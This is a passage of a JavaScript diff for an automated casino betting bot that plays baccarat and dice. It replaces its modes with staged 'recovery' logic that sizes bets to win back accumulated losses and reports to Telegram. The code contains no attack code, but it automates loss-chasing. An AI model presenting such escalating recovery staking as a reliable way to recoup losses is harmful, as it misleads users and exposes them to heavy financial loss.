-        updateBaccaratDisplay();
-        
-        return { isWin, isTie, pnl, result };
-    }
-    
-    async function switchToBaccaratMode() {
-        bot.baccarat.active = true;
-        bot.baccarat.betCount = 0;
-        bot.baccarat.consecutiveLosses = 0;
-        bot.baccarat.lossSinceStart = 0;
-        bot.baccarat.startBalance = bot.stats.currentBal;
-        bot.baccarat.baseBet = bot.stats.currentBal * (bot.baccarat.baseBetPct / 100);
-        if (bot.baccarat.baseBet < bot.minBet) bot.baccarat.baseBet = bot.minBet;
-        
-        // Reset tracking
-        bot.baccarat.lastWinner = null;
-        bot.baccarat.lastLoser = null;
-        bot.baccarat.cards = { player: [], banker: [], winner: null };
-        
-        // Tentukan side awal (random atau player)
-        bot.baccarat.side = "player";
-        
-        updateUILog(`🃏 SWITCH TO BACCARAT | BaseBet: ${bot.baccarat.baseBet.toFixed(8)} (${bot.baccarat.baseBetPct}%) | PRB 20% | Reverse Trend`);
-        
-        updateBaccaratDisplay();
-    }
-    
-    async function runBaccaratLoop() {
-        if (!bot.baccarat.active) return;
-        
-        // Cek profit keseluruhan sudah ≥ 0?
-        if (bot.stats.profit >= 0) {
-            updateUILog(`✅ BACCARAT RECOVERY SUCCESS! Profit: ${bot.stats.profit.toFixed(8)} → Switching to WAGER MODE`);
-            bot.baccarat.active = false;
-            bot.isWagerMode = true;
-            bot.wagerBetCounter = 0;
-            return;
-        }
-        
-        // Cek emergency trigger (100 bet tanpa profit ≥ 0)
-        if (bot.baccarat.betCount >= bot.baccarat.maxBetsBeforeEmergency && bot.stats.profit < 0) {
-            updateUILog(`⚠️ BACCARAT: ${bot.baccarat.betCount} bets without profit ≥ 0 → Switching to EMERGENCY RECOVERY`);
-            bot.baccarat.active = false;
-            bot.emergency.active = true;
-            bot.emergency.lossAmount = bot.baccarat.lossSinceStart;
-            bot.emergency.currentAttempts = 0;
-            bot.emergency.triggeredFrom = "baccarat";
-            return;
-        }
-        
-        // Dapatkan side berdasarkan reverse trend
-        const side = getReverseTrendSide();
-        bot.baccarat.side = side;
-        
-        // Hitung bet dengan PRB
-        const betAmount = calculateBaccaratBet();
-        
-        if (betAmount > bot.stats.currentBal) {
-            updateUILog(`❌ BACCARAT: Insufficient balance! Stopping bot.`);
-            bot.isRunning = false;
-            toggleStartStop(false);
-            return;
-        }
-        
-        updateUILog(`🃏 BACCARAT #${bot.baccarat.betCount+1} | Side: ${side.toUpperCase()} | Bet: ${betAmount.toFixed(8)} | Step: ${bot.baccarat.consecutiveLosses} | Loss: ${bot.baccarat.lossSinceStart.toFixed(8)}`);
-        
-        const result = await placeBaccaratBet(side, betAmount);
-        
-        if (result) {
-            const { isWin, isTie, pnl, result: gameResult } = processBaccaratResult(result, side, betAmount);
-            
-            const resultIcon = isWin ? "✅ WIN" : (isTie ? "🤝 TIE" : "❌ LOSS");
-            updateUILog(`🃏 Result: ${resultIcon} | ${side} vs ${gameResult} | PnL: ${pnl >= 0 ? '+' : ''}${pnl.toFixed(8)} | Balance: ${bot.stats.currentBal.toFixed(8)}`);
-            
-            bot.betTimestamps.push(Date.now());
-            if (bot.betTimestamps.length > 100) bot.betTimestamps.shift();
-        } else {
-            updateUILog(`❌ Baccarat bet failed!`);
-        }
-        
-        if (bot.baccarat.active) {
-            setTimeout(runBaccaratLoop, bot.delay);
-        }
-    }
-    
-    // ==================== EMERGENCY RECOVERY ====================
-    function calculateEmergencyBet(lossAmount, chance) {
-        const payout = 99 / chance;
-        const betAmount = Math.abs(lossAmount) / (payout - 1);
-        return betAmount;
-    }
-    
-    async function executeEmergencyBet() {
-        if (!bot.emergency.active) return;
-        
-        // Pilih chance random antara min dan max
-        const chanceRange = bot.emergency.maxChance - bot.emergency.minChance;
-        const chance = bot.emergency.minChance + (Math.random() * chanceRange);
-        const finalChance = Math.min(99, Math.max(1, parseFloat(chance.toFixed(1))));
-        
-        const betAmount = calculateEmergencyBet(bot.emergency.lossAmount, finalChance);
-        const finalBet = Math.min(betAmount, bot.stats.currentBal * 0.95);
-        
-        if (finalBet > bot.stats.currentBal) {
-            updateUILog(`❌ EMERGENCY: Insufficient balance! Stopping bot.`);
-            bot.isRunning = false;
-            bot.emergency.active = false;
-            toggleStartStop(false);
-            return;
-        }
-        
-        updateUILog(`🚨 EMERGENCY #${bot.emergency.currentAttempts + 1}/${bot.emergency.maxAttempts} | Chance: ${finalChance.toFixed(1)}% | Bet: ${finalBet.toFixed(8)} | Target Loss: ${bot.emergency.lossAmount.toFixed(8)}`);
-        
-        // Place bet menggunakan Dice dengan chance yang dipilih
-        const result = await placeBet(finalBet, finalChance);
-        
-        if (result && result.diceRoll) {
-            const d = result.diceRoll;
-            let win = false;
-            let payoutMultiplier = parseFloat(d.payoutMultiplier) || 0;
-            let payout = parseFloat(d.payout) || 0;
-            
-            if (d.win !== undefined) {
-                win = d.win;
-            } else if (payoutMultiplier > 1) {
-                win = true;
-                if (payout === 0) payout = finalBet * payoutMultiplier;
-            } else if (payoutMultiplier === 0 && payout === 0) {
-                win = false;
-            } else {
-                const state = d.state;
-                if (state && state.result !== undefined && state.target !== undefined) {
-                    win = state.condition === "above" ? state.result > state.target : state.result < state.target;
-                } else {
-                    win = false;
-                }
-            }
-            
-            const pnl = win ? (payout - finalBet) : -finalBet;
-            
-            bot.stats.bets++;
-            bot.stats.wagered += finalBet;
-            bot.stats.currentBal += pnl;
-            bot.stats.profit += pnl;
-            
-            if (win) {
-                bot.stats.wins++;
-                updateUILog(`🚨 EMERGENCY: ✅ WIN! PnL: +${pnl.toFixed(8)} | Balance: ${bot.stats.currentBal.toFixed(8)}`);
-                
-                // Success! Lanjut ke Wager Mode
-                bot.emergency.active = false;
-                bot.isWagerMode = true;
-                bot.wagerBetCounter = 0;
-                updateUILog(`✅ EMERGENCY SUCCESS! Switching to WAGER MODE`);
-                return;
-            } else {
-                bot.stats.loss++;
-                bot.emergency.currentAttempts++;
-                updateUILog(`🚨 EMERGENCY: ❌ LOSS! PnL: ${pnl.toFixed(8)} | Attempts left: ${bot.emergency.maxAttempts - bot.emergency.currentAttempts}`);
-                
-                // Update loss amount (loss makin besar)
-                bot.emergency.lossAmount = Math.abs(bot.stats.profit);
-                
-                // Cek max attempts
-                if (bot.emergency.currentAttempts >= bot.emergency.maxAttempts) {
-                    updateUILog(`❌ EMERGENCY FAILED! Max attempts reached. Stopping bot.`);
-                    bot.isRunning = false;
-                    bot.emergency.active = false;
-                    toggleStartStop(false);
-                    await sendTelegramReport(`\`\`\`🚨 EMERGENCY RECOVERY FAILED\nLoss: ${bot.stats.profit.toFixed(8)}\nBalance: ${bot.stats.currentBal.toFixed(8)}\`\`\``);
-                    return;
-                }
-            }
-        } else {
-            updateUILog(`❌ Emergency bet failed!`);
-            bot.emergency.currentAttempts++;
-        }
-        
-        if (bot.emergency.active) {
-            setTimeout(executeEmergencyBet, bot.delay);
+            let bet = parseFloat(document.getElementById("p-basebet-fixed").value) || 0.001;
+            if (bet < 0.00000001) bet = 0.00000001;
+            return bet;
         }
     }
 
-    // ==================== LOGIKA BOT (HUNTER DICE) ====================
-    function setNewBaseChance() {
-        bot.baseChance = parseFloat((Math.random() * (bot.chanceMax - bot.chanceMin) + bot.chanceMin).toFixed(1));
-        bot.currentChance = bot.baseChance;
-        bot.singleChanceBets = 0;
-        bot.singleChanceLimit = Math.round(99 / bot.baseChance);
-        bot.tg = bot.perStep;
+    // ========== STAGE 1: BACCARAT REVERSE ==========
+    function getReverseBetSide() {
+        if (bot.baccaratReverse.lastResult === "player") return "banker";
+        if (bot.baccaratReverse.lastResult === "banker") return "player";
+        return "player";
     }
-    
-    function resetProfitStats() {
-        const savedWagered = bot.stats.wagered;
+
+    function calculateStage1Bet() {
+        const baseBet = getBaseBet();
+        const multiplier = parseFloat(document.getElementById("p-baccarat-multiplier").value) || 1.2;
         
-        bot.stats.startBal = bot.stats.currentBal;
-        bot.stats.profit = 0;
-        bot.stats.bets = 0;
-        bot.stats.wins = 0;
-        bot.stats.loss = 0;
-        bot.stats.maxDD = 0;
-        bot.stats.maxBet = 0;
-        bot.stats.wagered = savedWagered;
-        
-        bot.targetAbs = bot.stats.startBal * (bot.targetPercent / 100);
-        bot.perStep = bot.targetAbs / bot.stepsLimit;
-        bot.wagerBetCounter = 0;
-        bot.isWagerMode = false;
-        
-        updateBaseBet();
-        setNewBaseChance();
-        
-        updateUILog("WAGER DONE! Profit reset. Back to HUNTER.");
-    }
-    
-    function checkWagerMode() {
-        if (bot.stats.startBal <= 0) return;
-        
-        const profitPct = (bot.stats.profit / bot.stats.startBal) * 100;
-        
-        if (!bot.isWagerMode && profitPct >= bot.profitTargetPct) {
-            bot.isWagerMode = true;
-            bot.wagerBetCounter = 0;
-            updateUILog("WAGER MODE ACTIVATED! (50 bets)");
-        }
-    }
-    
-    function checkMaxBetTrigger() {
-        // Cek apakah bet size mencapai maxBetMultiplier (trigger pindah ke Baccarat)
-        const maxBet = bot.baseBet * bot.maxBetMultiplier;
-        const nextBet = calculateHunterBet();
-        
-        if (nextBet >= maxBet && !bot.baccarat.active && !bot.emergency.active && !bot.isWagerMode && bot.baccarat.enabled) {
-            updateUILog(`⚠️ MAX BET TRIGGERED! Bet: ${nextBet.toFixed(8)} >= Max: ${maxBet.toFixed(8)} → Switching to BACCARAT`);
-            switchToBaccaratMode();
-            return true;
-        }
-        return false;
-    }
-    
-    function calculateHunterBet() {
-        if (bot.isWagerMode) {
-            return bot.stats.currentBal / bot.wagerDV;
+        if (bot.baccaratReverse.lastBetAmount === 0) {
+            return baseBet;
         }
         
-        const payout = 99 / bot.currentChance;
-        let nextBet = (Math.abs(bot.tg) / (payout - 1)) * bot.margin;
-        if (bot.tg === bot.perStep) nextBet = bot.baseBet;
+        let nextBet = bot.baccaratReverse.lastBetAmount * multiplier;
         
-        if (nextBet < bot.minBet) nextBet = bot.minBet;
-        
-        const maxBet = bot.baseBet * bot.maxBetMultiplier;
-        if (nextBet > maxBet && !bot.baccarat.enabled) {
-            nextBet = bot.baseBet;
-            bot.tg = bot.perStep;
+        const currentBalance = bot.stats.startBal + bot.stats.profit;
+        if (currentBalance > bot.stats.peakBalance) {
+            bot.stats.peakBalance = currentBalance;
+            bot.baccaratReverse.sessionPeak = currentBalance;
+            bot.baccaratReverse.betsInSession = 0;
+            updateConsoleLog(`🎯 New peak! Reset to base: ${baseBet.toFixed(8)}`);
+            return baseBet;
         }
         
         return nextBet;
     }
 
+    function processStage1Result(betResult, betAmount, betSide) {
+        const state = betResult.state || {};
+        const result = state.result || "unknown";
+        const payout = betResult.payout || 0;
+        const pnl = payout - betAmount;
+        
+        parseBaccaratCards(betResult);
+        
+        const isWin = (result === betSide);
+        const isTie = (result === "tie");
+        
+        if (isWin) {
+            bot.stats.wins++;
+            bot.baccaratReverse.consecutiveLosses = 0;
+            updateConsoleLog(`✅ WIN! ${betSide.toUpperCase()} | +${pnl.toFixed(8)}`);
+        } else if (isTie) {
+            bot.stats.ties = (bot.stats.ties || 0) + 1;
+            updateConsoleLog(`🤝 TIE! Bet returned`);
+        } else {
+            bot.stats.loss++;
+            bot.baccaratReverse.consecutiveLosses++;
+            updateConsoleLog(`❌ LOSS! ${betSide.toUpperCase()} | ${pnl.toFixed(8)}`);
+        }
+        
+        bot.baccaratReverse.lastResult = result;
+        bot.baccaratReverse.lastBetAmount = betAmount;
+        bot.baccaratReverse.betsInSession++;
+        bot.stats.bets++;
+        bot.stats.wagered += betAmount;
+        bot.stats.profit += pnl;
+        
+        if (bot.stats.profit < bot.stats.maxDD) bot.stats.maxDD = bot.stats.profit;
+        
+        const currentBalance = bot.stats.startBal + bot.stats.profit;
+        if (bot.baccaratReverse.betsInSession >= 100 && currentBalance <= bot.stats.peakBalance) {
+            updateConsoleLog(`⚠️ 100 bets no profit! Moving to Stage 2 (DICE RECOVERY)`);
+            bot.currentStage = "DICE_RECOVERY";
+            const lossAmount = bot.stats.peakBalance - currentBalance;
+            bot.diceRecovery.targetLoss = lossAmount;
+            bot.diceRecovery.remainingBets = 5;
+            bot.diceRecovery.currentChance = 50;
+            sendTelegram(`📊 → STAGE 2: DICE RECOVERY\nLoss: ${lossAmount.toFixed(8)}`);
+        }
+        
+        const profitTrigger = parseFloat(document.getElementById("p-profit-trigger").value) || 0.01;
+        if (bot.stats.profit >= profitTrigger) {
+            updateConsoleLog(`🎉 Profit target! Moving to WAGERING`);
+            bot.currentStage = "WAGERING";
+            bot.wagering.betsInWagering = 0;
+            sendTelegram(`🎉 → WAGERING MODE (${document.getElementById("p-wagering-bets").value} bets)`);
+        }
+        
+        return pnl;
+    }
+
+    // ========== STAGE 2: DICE RECOVERY ==========
+    function calculateStage2Bet() {
+        if (bot.diceRecovery.remainingBets <= 0) return 0;
+        
+        const lossAmount = bot.diceRecovery.targetLoss;
+        const chance = bot.diceRecovery.currentChance;
+        const multiplier = (100 / chance) - 1;
+        if (multiplier <= 0) return 0.00000001;
+        
+        let bet = Math.abs(lossAmount) / multiplier * 1.033;
+        const minBet = 0.00000001;
+        if (bet < minBet) bet = minBet;
+        
+        bot.diceRecovery.currentBet = bet;
+        return bet;
+    }
+    
+    function updateDiceChance() {
+        const lossAmount = Math.abs(bot.diceRecovery.targetLoss);
+        const maxLoss = bot.stats.startBal * 0.1;
+        let ratio = Math.min(1, lossAmount / maxLoss);
+        let newChance = 50 - (ratio * 26);
+        newChance = Math.max(24, Math.min(50, newChance));
+        bot.diceRecovery.currentChance = Math.floor(newChance);
+        updateConsoleLog(`🎲 Dice chance: ${bot.diceRecovery.currentChance}%`);
+    }
+
+    function processStage2Result(betResult, betAmount, chance) {
+        const payout = betResult.payout || 0;
+        const pnl = payout - betAmount;
+        
+        bot.stats.profit += pnl;
+        bot.stats.bets++;
+        bot.stats.wagered += betAmount;
+        bot.diceRecovery.remainingBets--;
+        
+        if (pnl > 0) {
+            bot.stats.wins++;
+            updateConsoleLog(`✅ DICE WIN! ${chance}% | +${pnl.toFixed(8)}`);
+            const currentLoss = bot.diceRecovery.targetLoss + bot.stats.profit;
+            if (currentLoss <= 0) {
+                updateConsoleLog(`🎉 Loss recovered! Moving to WAGERING`);
+                bot.currentStage = "WAGERING";
+                bot.wagering.betsInWagering = 0;
+                sendTelegram(`🎉 Loss recovered! → WAGERING MODE`);
+                return;
+            }
+            bot.diceRecovery.targetLoss = currentLoss;
+            updateDiceChance();
+        } else {
+            bot.stats.loss++;
+            updateConsoleLog(`❌ DICE LOSS! ${chance}% | ${pnl.toFixed(8)} | Remaining: ${bot.diceRecovery.remainingBets}`);
+        }
+        
+        if (bot.diceRecovery.remainingBets <= 0) {
+            const currentLoss = bot.diceRecovery.targetLoss + bot.stats.profit;
+            if (currentLoss > 0) {
+                updateConsoleLog(`⚠️ 5 DICE bets done. Moving to STAGE 3 (TIE RECOVERY)`);
+                bot.currentStage = "TIE_RECOVERY";
+                bot.tieRecovery.targetLoss = currentLoss;
+                sendTelegram(`📊 → STAGE 3: TIE RECOVERY\nLoss: ${currentLoss.toFixed(8)}`);
+            }
+        }
+        
+        if (bot.stats.profit < bot.stats.maxDD) bot.stats.maxDD = bot.stats.profit;
+    }
+
+    // ========== STAGE 3: TIE RECOVERY ==========
+    function calculateStage3Bet() {
+        const lossAmount = bot.tieRecovery.targetLoss;
+        let bet = Math.abs(lossAmount) / 8 * 1.033;
+        if (bet < 0.00000001) bet = 0.00000001;
+        bot.tieRecovery.currentBet = bet;
+        return bet;
+    }
+
+    function processStage3Result(betResult, betAmount) {
+        const state = betResult.state || {};
+        const result = state.result || "unknown";
+        const payout = betResult.payout || 0;
+        const pnl = payout - betAmount;
+        
+        parseBaccaratCards(betResult);
+        
+        const isWin = (result === "tie");
+        
+        if (isWin) {
+            bot.stats.wins++;
+            updateConsoleLog(`✅ TIE WIN! +${pnl.toFixed(8)}`);
+            bot.currentStage = "WAGERING";
+            bot.wagering.betsInWagering = 0;
+            sendTelegram(`🎉 Tie recovered! → WAGERING MODE`);
+        } else {
+            bot.stats.loss++;
+            updateConsoleLog(`❌ TIE LOSS! ${pnl.toFixed(8)} | Continuing...`);
+        }
+        
+        bot.stats.bets++;
+        bot.stats.wagered += betAmount;
+        bot.stats.profit += pnl;
+        if (bot.stats.profit < bot.stats.maxDD) bot.stats.maxDD = bot.stats.profit;
+        
+        return pnl;
+    }
+
+    // ========== WAGERING MODE ==========
+    function calculateWageringBet() {
+        const useDynamic = document.getElementById("p-wagering-dynamic").checked;
+        let baseBet;
+        
+        if (useDynamic) {
+            const currentBalance = bot.stats.startBal + bot.stats.profit;
+            const divisor = parseFloat(document.getElementById("p-wagering-divisor").value) || 300000;
+            baseBet = currentBalance / divisor;
+        } else {
+            baseBet = parseFloat(document.getElementById("p-wagering-basebet").value) || 0.001;
+        }
+        
+        const multiplier = parseFloat(document.getElementById("p-wagering-multiplier").value) || 1;
+        let bet = baseBet * multiplier;
+        
+        if (bet < 0.00000001) bet = 0.00000001;
+        return bet;
+    }
+
+    function getWageringChance() {
+        return parseFloat(document.getElementById("p-wagering-chance").value) || 99.98;
+    }
+
+    function getWageringPayout() {
+        const chance = getWageringChance();
+        return 100 / chance;
+    }
+
+    function processWageringResult(betResult, betAmount) {
+        const payout = betResult.payout || 0;
+        const pnl = payout - betAmount;
+        
+        bot.stats.profit += pnl;
+        bot.wagering.betsInWagering++;
+        bot.stats.bets++;
+        bot.stats.wagered += betAmount;
+        
+        if (pnl > 0) bot.stats.wins++;
+        else if (pnl < 0) bot.stats.loss++;
+        
+        if (bot.stats.profit < bot.stats.maxDD) bot.stats.maxDD = bot.stats.profit;
+        
+        updateConsoleLog(`🎲 WAGERING [${bot.wagering.betsInWagering}/${document.getElementById("p-wagering-bets").value}] | ${pnl >= 0 ? '✅' : '❌'} | PnL: ${pnl >= 0 ? '+' : ''}${pnl.toFixed(8)}`);
+        
+        const maxBets = parseInt(document.getElementById("p-wagering-bets").value) || 30;
+        if (bot.wagering.betsInWagering >= maxBets) {
+            updateConsoleLog(`📊 ${maxBets} WAGERING bets completed! Resetting stats...`);
+            
+            const totalWagered = bot.stats.wagered;
+            const newBalance = bot.stats.startBal + bot.stats.profit;
+            
+            bot.stats = {
+                profit: 0,
+                wagered: totalWagered,
+                startBal: newBalance,
+                bets: 0,
+                wins: 0,
+                loss: 0,
+                maxDD: 0,
+                ties: 0,
+                peakBalance: newBalance
+            };
+            
+            bot.wagering.betsInWagering = 0;
+            
+            bot.currentStage = "BACCARAT_REVERSE";
+            bot.baccaratReverse = {
+                lastBetSide: "player",
+                lastBetAmount: 0,
+                lastResult: null,
+                consecutiveLosses: 0,
+                sessionPeak: newBalance,
+                betsInSession: 0,
+                currentBet: 0
+            };
+            
+            sendTelegram(`📊 Wagering complete!\nNew balance: ${newBalance.toFixed(8)}\nReturning to Stage 1`);
+            updateStatsDisplay();
+        }
+    }
+
+    // ========== MAIN LOOP ==========
     async function runLoop() {
-        if (!bot.isRunning || bot.isSleeping) return;
+        if (!bot.isRunning) return;
         
-        // PRIORITAS 1: Emergency Recovery
-        if (bot.emergency.active) {
-            await executeEmergencyBet();
-            return;
-        }
+        updateIdrPrice();
         
-        // PRIORITAS 2: Baccarat Mode
-        if (bot.baccarat.active) {
-            await runBaccaratLoop();
-            return;
-        }
+        let betAmount = 0;
+        let gameToPlay = "baccarat";
+        let betSide = null;
+        let chance = null;
         
-        const now = Date.now();
-        
-        await updateFiatRates();
-        
-        if (now - bot.lastTGReport >= TG_CONFIG.reportInterval && bot.stats.bets > 0) {
-            bot.lastTGReport = now;
-            await sendSessionReport();
+        switch(bot.currentStage) {
+            case "BACCARAT_REVERSE":
+                gameToPlay = "baccarat";
+                betSide = getReverseBetSide();
+                betAmount = calculateStage1Bet();
+                const multiplier = parseFloat(document.getElementById("p-baccarat-multiplier").value) || 1.2;
+                const baseInfo = document.getElementById("p-basebet-auto").checked ? "auto" : "fixed";
+                bot.currentStatus = `STAGE 1: BACCARAT REVERSE (${betSide.toUpperCase()} | ${multiplier}x | ${baseInfo})`;
+                break;
+                
+            case "DICE_RECOVERY":
+                gameToPlay = "dice";
+                betAmount = calculateStage2Bet();
+                if (betAmount <= 0 || bot.diceRecovery.remainingBets <= 0) {
+                    bot.currentStage = "TIE_RECOVERY";
+                    runLoop();
+                    return;
+                }
+                chance = bot.diceRecovery.currentChance;
+                bot.currentStatus = `STAGE 2: DICE ${chance}% (${bot.diceRecovery.remainingBets}/5)`;
+                break;
+                
+            case "TIE_RECOVERY":
+                gameToPlay = "baccarat";
+                betSide = "tie";
+                betAmount = calculateStage3Bet();
+                bot.currentStatus = `STAGE 3: TIE RECOVERY (8:1)`;
+                break;
+                
+            case "WAGERING":
+                gameToPlay = "dice";
+                betAmount = calculateWageringBet();
+                chance = getWageringChance();
+                bot.currentStatus = `WAGERING (${bot.wagering.betsInWagering + 1}/${document.getElementById("p-wagering-bets").value} | ${chance}%)`;
+                break;
+                
+            default:
+                bot.currentStage = "BACCARAT_REVERSE";
+                runLoop();
+                return;
         }
         
         try {
-            let nextBet, chanceToUse;
-            const currentBalance = bot.stats.currentBal;
+            let res;
             
-            if (currentBalance <= 0) {
-                updateUILog("Balance is zero! Stopping bot.");
-                bot.isRunning = false;
-                toggleStartStop(false);
-                return;
-            }
-            
-            // Cek trigger maxBet untuk pindah ke Baccarat
-            if (checkMaxBetTrigger()) {
-                return;
-            }
-            
-            if (bot.isWagerMode) {
-                nextBet = currentBalance / bot.wagerDV;
-                chanceToUse = bot.wagerChance;
-            } else {
-                if (bot.singleChanceBets < bot.singleChanceLimit) {
-                    bot.currentChance = bot.baseChance;
-                } else {
-                    bot.currentChance = Math.floor(Math.random() * 11) + (bot.baseChance + 5);
-                }
-                chanceToUse = Math.min(95, Math.max(1, bot.currentChance));
+            if (gameToPlay === "baccarat") {
+                res = await placeBetWithToken(betAmount, null, "baccarat", betSide);
+                if (res.errors) { bot.lastError = res.errors[0].message; setTimeout(runLoop, 400); return; }
+                const data = res?.data || res;
+                const betResult = data.baccaratBet || data;
                 
-                const payout = 99 / chanceToUse;
-                nextBet = (Math.abs(bot.tg) / (payout - 1)) * bot.margin;
-                if (bot.tg === bot.perStep) nextBet = bot.baseBet;
-                
-                if (nextBet < bot.minBet) nextBet = bot.minBet;
-                
-                const maxBet = bot.baseBet * bot.maxBetMultiplier;
-                if (nextBet > maxBet && !bot.baccarat.enabled) {
-                    nextBet = bot.baseBet;
-                    bot.tg = bot.perStep;
-                }
-            }
-            
-            if (nextBet > currentBalance && currentBalance > 0) nextBet = currentBalance;
-            if (nextBet < 0.00000001) nextBet = 0.00000001;
-            if (nextBet > bot.stats.maxBet) bot.stats.maxBet = nextBet;
-
-            const result = await placeBet(nextBet, chanceToUse);
-            
-            if (result && result.diceRoll) {
-                const d = result.diceRoll;
-                
-                let win;
-                let winAmount = parseFloat(d.amount) || 0;
-                let payoutMultiplier = parseFloat(d.payoutMultiplier) || 0;
-                let payout = parseFloat(d.payout) || 0;
-                
-                if (d.win !== undefined) {
-                    win = d.win;
-                } else if (payoutMultiplier > 1) {
-                    win = true;
-                    if (payout === 0) payout = winAmount * payoutMultiplier;
-                } else if (payoutMultiplier === 0 && payout === 0) {
-                    win = false;
-                } else {
-                    const state = d.state;
-                    if (state && state.result !== undefined && state.target !== undefined) {
-                        win = state.condition === "above" ? state.result > state.target : state.result < state.target;
-                    } else {
-                        win = false;
+                if (betResult && bot.isRunning) {
+                    if (bot.currentStage === "BACCARAT_REVERSE") {
+                        processStage1Result(betResult, betAmount, betSide);
+                    } else if (bot.currentStage === "TIE_RECOVERY") {
+                        processStage3Result(betResult, betAmount);
                     }
+                    bot.lastError = "None";
                 }
+            } else if (gameToPlay === "dice") {
+                const payout = getWageringPayout();
+                res = await placeBetWithToken(betAmount, payout, "dice", null, chance);
+                if (res.errors) { bot.lastError = res.errors[0].message; setTimeout(runLoop, 400); return; }
+                const data = res?.data || res;
+                const betResult = data.diceRoll || data;
                 
-                const pft = win ? (payout - winAmount) : -winAmount;
-                
-                bot.stats.bets++; 
-                bot.stats.wagered += winAmount;
-                bot.stats.profit += pft; 
-                bot.stats.currentBal += pft;
-                
-                bot.betTimestamps.push(Date.now());
-                if (bot.betTimestamps.length > 100) bot.betTimestamps.shift();
-                
-                if (bot.stats.currentBal < bot.stats.startBal) {
-                    let dd = bot.stats.startBal - bot.stats.currentBal;
-                    if (dd > bot.stats.maxDD) bot.stats.maxDD = dd;
-                }
-
-                const modeTag = bot.isWagerMode ? "[W]" : "";
-                updateLogs(winAmount, chanceToUse, pft, modeTag, win);
-
-                if (win) { 
-                    bot.stats.wins++;
-                    if (!bot.isWagerMode) setNewBaseChance();
-                } else { 
-                    bot.stats.loss++;
-                    if (!bot.isWagerMode) {
-                        bot.singleChanceBets++; 
-                        bot.tg += (winAmount + bot.perStep);
+                if (betResult && bot.isRunning) {
+                    if (bot.currentStage === "DICE_RECOVERY") {
+                        processStage2Result(betResult, betAmount, chance);
+                    } else if (bot.currentStage === "WAGERING") {
+                        processWageringResult(betResult, betAmount);
                     }
-                }
-                
-                if (bot.isWagerMode) {
-                    bot.wagerBetCounter++;
-                    if (bot.wagerBetCounter >= bot.wagerBetCount) {
-                        resetProfitStats();
-                    }
-                } else {
-                    checkWagerMode();
-                }
-
-                const stopLossAbs = bot.stats.startBal * (bot.stopLossPercent / 100);
-                
-                if (bot.stats.profit >= bot.targetAbs) { 
-                    bot.isRunning = false; 
-                    updateUILog("TARGET PROFIT REACHED! Bot Stopped.");
-                    toggleStartStop(false);
-                    await sendTelegramReport(`\`\`\`TARGET PROFIT REACHED\nProfit: ${bot.stats.profit.toFixed(8)}\`\`\``);
-                    return;
-                }
-                
-                if (bot.stats.profit <= -stopLossAbs) {
-                    bot.isRunning = false;
-                    updateUILog("STOP LOSS REACHED! Bot Stopped.");
-                    toggleStartStop(false);
-                    const profitPct = (bot.stats.profit / bot.stats.startBal) * 100;
-                    await sendTelegramReport(`\`\`\`STOP LOSS REACHED\nLoss: ${profitPct.toFixed(2)}%\`\`\``);
-                    return;
-                }
-                
-                if (!bot.isWagerMode && bot.stats.bets >= bot.stepsLimit) {
-                    updateUILog("STEPS LIMIT REACHED! Sleeping 5s...");
-                    bot.isSleeping = true;
-                    
-                    setTimeout(() => {
-                        bot.stats.bets = 0;
-                        bot.stats.wins = 0;
-                        bot.stats.loss = 0;
-                        bot.betTimestamps = [];
-                        bot.isSleeping = false;
-                        bot.isRunning = true;
-                        updateUILog("Steps reset! Continuing...");
-                        runLoop();
-                    }, 5000);
-                    return;
+                    bot.lastError = "None";
                 }
             }
             
-            if (bot.isRunning && !bot.isSleeping) {
-                setTimeout(runLoop, bot.delay);
-            }
-        } catch (e) {
-            updateUILog(`Error: ${e.message}`);
-            setTimeout(runLoop, 1000);
+            updateStatsDisplay();
+            if (bot.isRunning) setTimeout(runLoop, 0);
+            
+        } catch (e) { 
+            bot.lastError = e.message; 
+            if (bot.isRunning) setTimeout(runLoop, 500); 
         }
     }
 
-    function updateLogs(amt, ch, pft, mode, isWin) {
-        const logBox = document.getElementById("p-logs");
-        if (!logBox) return;
-        const entry = document.createElement("div");
-        const timestamp = new Date().toLocaleTimeString();
-        
-        entry.style.color = isWin ? "#00A86B" : "#FF4757";
-        entry.style.padding = "2px 8px";
-        entry.style.fontSize = "12px";
-        entry.style.fontFamily = "monospace";
-        entry.style.borderBottom = "1px solid " + (bot.darkMode ? "#1a1a2e" : "#f0f0f0");
-        entry.textContent = `${timestamp} ${mode} ${amt.toFixed(8)} | ${ch.toFixed(1)}% | ${pft > 0 ? '+' : ''}${pft.toFixed(8)}`;
-        logBox.insertBefore(entry, logBox.firstChild);
-        while (logBox.children.length > 100) logBox.removeChild(logBox.lastChild);
-    }
-
-    function updateUILog(message) {
-        const logBox = document.getElementById("p-logs");
-        if (!logBox) return;
-        const entry = document.createElement("div");
-        const timestamp = new Date().toLocaleTimeString();
-        entry.style.color = "#4A90D9";
-        entry.style.padding = "2px 8px";
-        entry.style.fontSize = "12px";
-        entry.style.fontFamily = "monospace";
-        entry.style.borderBottom = "1px solid " + (bot.darkMode ? "#1a1a2e" : "#f0f0f0");
-        entry.textContent = `${timestamp} ${message}`;
-        logBox.insertBefore(entry, logBox.firstChild);
-        while (logBox.children.length > 100) logBox.removeChild(logBox.lastChild);
+    function updateConsoleLog(msg) {
+        const logEl = document.getElementById("st-log");
+        if (logEl) {
+            const time = new Date().toLocaleTimeString();
+            logEl.innerHTML = `[${time}] ${msg}<br>` + logEl.innerHTML;
+            if (logEl.innerHTML.length > 5000) logEl.innerHTML = logEl.innerHTML.substring(0, 3000);
+        }
+        console.log(msg);
     }
 
     function updateStatsDisplay() {
         const profitPct = bot.stats.startBal > 0 ? (bot.stats.profit / bot.stats.startBal * 100) : 0;
-        const winRate = bot.stats.bets > 0 ? (bot.stats.wins / bot.stats.bets * 100) : 0;
-        const runTime = getDuration();
-        const rakeback = bot.stats.wagered * 0.00098;
-        let mode = bot.isWagerMode ? `WAGER (${bot.wagerBetCounter}/${bot.wagerBetCount})` : "HUNTER";
-        if (bot.baccarat.active) mode = `BACCARAT (${bot.baccarat.consecutiveLosses}x)`;
-        if (bot.emergency.active) mode = `EMERGENCY (${bot.emergency.currentAttempts}/${bot.emergency.maxAttempts})`;
-        const betSpeed = getBetSpeed();
+        const currentBalance = bot.stats.startBal + bot.stats.profit;
+        document.getElementById("st-startbal").innerText = currentBalance.toFixed(8);
+        document.getElementById("st-profit").innerHTML = `${bot.stats.profit >= 0 ? '▲' : '▼'} ${bot.stats.profit.toFixed(8)} <span style="font-size:10px">(${profitPct >= 0 ? '+' : ''}${profitPct.toFixed(2)}%)</span>`;
+        document.getElementById("st-wager").innerText = bot.stats.wagered.toFixed(8);
